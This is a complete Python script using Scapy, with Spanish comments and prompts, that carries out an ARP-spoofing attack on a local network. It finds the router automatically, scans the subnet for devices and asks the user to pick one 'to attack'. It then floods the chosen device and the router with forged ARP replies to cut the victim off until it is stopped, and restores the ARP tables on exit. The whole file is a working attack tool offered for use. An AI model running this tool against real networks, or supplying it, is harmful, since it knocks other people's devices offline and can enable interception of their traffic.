#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.all import *
import time
import argparse
import sys
import ipaddress

def get_mac(ip_address):
    """
    Obtiene la dirección MAC de una IP en la red local usando un paquete ARP.
    """
    try:
        arp_request = ARP(pdst=ip_address)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        return None

def get_default_gateway_ip():
    """
    Intenta obtener la IP del gateway (router) de forma automática.
    """
    try:
        # Scapy puede obtener la ruta por defecto
        gateway_ip = conf.route.route("0.0.0.0")[2]
        return gateway_ip
    except Exception:
        return None

def scan_network(network_range):
    """
    Escanea un rango de red para encontrar hosts activos y sus MACs.
    """
    print(f"[*] Escaneando la red: {network_range}...")
    active_hosts = []
    
    try:
        # Crear una lista de IPs a partir del rango de red
        ips_to_scan = ipaddress.ip_network(network_range, strict=False).hosts()
        
        # Enviar paquetes ARP a cada IP
        arp_request = ARP(pdst=str(network_range))
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        
        # srp() envía y recibe paquetes a nivel 2
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        
        # Procesar las respuestas
        for element in answered_list:
            ip = element[1].psrc
            mac = element[1].hwsrc
            active_hosts.append({'ip': ip, 'mac': mac})
            
    except Exception as e:
        print(f"[-] Ocurrió un error durante el escaneo: {e}")
        return None
        
    return active_hosts

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    """
    Restaura la tabla ARP de los dispositivos a su estado original.
    """
    print("[+] Restaurando la tabla ARP...")
    packet_to_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    packet_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    send(packet_to_target, count=5, verbose=False)
    send(packet_to_gateway, count=5, verbose=False)
    print("[+] Tabla ARP restaurada. Saliendo.")

def main():
    parser = argparse.ArgumentParser(description="Script para desconectar un dispositivo específico de la red local (ARP Spoofing).")
    parser.add_argument("-t", "--target", help="Dirección IP del dispositivo a desconectar (víctima). Si no se especifica, se escaneará la red.")
    parser.add_argument("-g", "--gateway", help="Dirección IP del gateway (router). Si no se especifica, se intentará detectar automáticamente.")
    
    args = parser.parse_args()
    
    target_ip = args.target
    gateway_ip = args.gateway

    # --- Detección Automática del Gateway ---
    if not gateway_ip:
        print("[*] No se especificó gateway. Intentando detectarlo automáticamente...")
        gateway_ip = get_default_gateway_ip()
        if not gateway_ip:
            print("[-] Error: No se pudo detectar el gateway automáticamente. Por favor, especificalo con -g <IP_ROUTER>")
            sys.exit(1)
        print(f"[+] Gateway detectado automáticamente: {gateway_ip}")

    # --- Selección del Objetivo (Manual o Automática) ---
    target_mac = None
    if not target_ip:
        print("\n[*] No se especificó un objetivo. Iniciando escaneo de red para encontrar dispositivos...")
        # Determinar el rango de red a partir del gateway (ej: 192.168.1.1 -> 192.168.1.0/24)
        network_parts = gateway_ip.split('.')
        network_range = f"{network_parts[0]}.{network_parts[1]}.{network_parts[2]}.0/24"
        
        hosts = scan_network(network_range)
        
        if not hosts:
            print("[-] No se encontraron hosts activos en la red o el escaneo falló.")
            sys.exit(1)
            
        print("\n[+] Dispositivos activos encontrados:")
        for i, host in enumerate(hosts):
            print(f"  {i+1}) IP: {host['ip']}\tMAC: {host['mac']}")
            
        while True:
            try:
                choice = int(input("\n[?] Elegí el número del dispositivo que querés atacar: ")) - 1
                if 0 <= choice < len(hosts):
                    target_ip = hosts[choice]['ip']
                    target_mac = hosts[choice]['mac']
                    print(f"\n[+] Objetivo seleccionado: {target_ip} ({target_mac})")
                    break
                else:
                    print("[-] Opción inválida. Elegí un número de la lista.")
            except ValueError:
                print("[-] Entrada inválida. Por favor, ingresá un número.")
    else:
        # Si se especificó un objetivo, obtener su MAC
        print(f"[*] Obteniendo la MAC del objetivo ({target_ip})...")
        target_mac = get_mac(target_ip)
        if target_mac is None:
            print(f"[-] Error: No se pudo encontrar la MAC del objetivo en la IP {target_ip}. ¿Está en la red?")
            sys.exit(1)
        print(f"[+] MAC del objetivo encontrada: {target_mac}")

    # --- Obtener MAC del Gateway ---
    print(f"[*] Obteniendo la MAC del router ({gateway_ip})...")
    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print(f"[-] Error: No se pudo encontrar la MAC del router en la IP {gateway_ip}. ¿Está en la red?")
        sys.exit(1)
    print(f"[+] MAC del router encontrada: {gateway_mac}")

    # --- Iniciar Ataque ---
    print("\n[!] Iniciando el ataque ARP Spoofing. Presiona Ctrl+C para detener y restaurar la red.")
    
    try:
        sent_packets_count = 0
        while True:
            arp_target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            arp_gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
            
            send(arp_target_packet, verbose=False)
            send(arp_gateway_packet, verbose=False)
            
            sent_packets_count += 2
            print(f"\r[*] Paquetes enviados: {sent_packets_count}", end="")
            
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[+] Ataque detenido. Restaurando la conexión...")
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)

if __name__ == "__main__":
    main()